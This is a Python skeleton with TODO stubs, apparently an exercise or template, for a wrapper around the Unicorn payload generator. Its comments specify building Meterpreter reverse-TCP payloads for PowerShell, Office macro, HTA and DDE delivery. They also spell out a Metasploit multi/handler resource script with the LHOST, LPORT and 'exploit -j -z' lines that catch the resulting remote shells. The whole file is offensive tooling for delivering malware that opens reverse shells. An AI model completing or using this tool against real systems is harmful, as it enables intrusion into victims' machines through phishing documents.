class UnicornWrapper:
    """Automate Unicorn payload generation for multiple delivery formats."""

    UNICORN_PATH = "/opt/unicorn/unicorn.py"
    SUPPORTED_FORMATS = ["powershell", "macro", "hta", "dde"]

    def __init__(self, lhost: str, lport: int, payload: str = "windows/meterpreter/reverse_tcp"):
        """Store connection parameters and payload string."""
        # TODO: Assign lhost, lport, and payload to instance attributes
        pass

    def generate(self, fmt: str, output_dir: str) -> bool:
        """
        Run Unicorn for a single delivery format and move output files
        into output_dir so each format has its own subdirectory.

        Returns True on success, False on non-zero exit code.
        """
        # TODO: Build the subprocess command list:
        #       ["python3", self.UNICORN_PATH, self.payload, self.lhost, str(self.lport), fmt]
        # TODO: Create output_dir if it does not exist
        # TODO: Run the command with subprocess.run, capturing stdout and stderr,
        #       using output_dir as the working directory (cwd=)
        # TODO: Return True if returncode == 0, otherwise print stderr and return False
        pass

    def generate_all(self, base_dir: str) -> dict:
        """
        Call generate() for every format in SUPPORTED_FORMATS.
        Returns a dict mapping format name -> True/False result.
        """
        # TODO: Iterate over SUPPORTED_FORMATS
        # TODO: For each format, call self.generate(fmt, os.path.join(base_dir, fmt))
        # TODO: Collect results in a dict and return it
        pass

    def write_listener_rc(self, path: str) -> None:
        """
        Write a Metasploit resource script to path that starts a
        multi/handler for the configured payload, LHOST, and LPORT.
        """
        # TODO: Build the rc file content as a multi-line string with:
        #       use exploit/multi/handler
        #       set payload <self.payload>
        #       set LHOST <self.lhost>
        #       set LPORT <self.lport>
        #       set ExitOnSession false
        #       exploit -j -z
        # TODO: Write the string to path
        pass


def main():
    """Parse --lhost, --lport, --format (optional), --all flags with argparse."""
    # TODO: Set up ArgumentParser with the flags listed in the docstring
    # TODO: Instantiate UnicornWrapper with parsed arguments
    # TODO: If --all is set, call generate_all(); otherwise call generate() for --format
    # TODO: Always call write_listener_rc() to produce listener.rc in the output directory
    pass


if __name__ == "__main__":
    main()
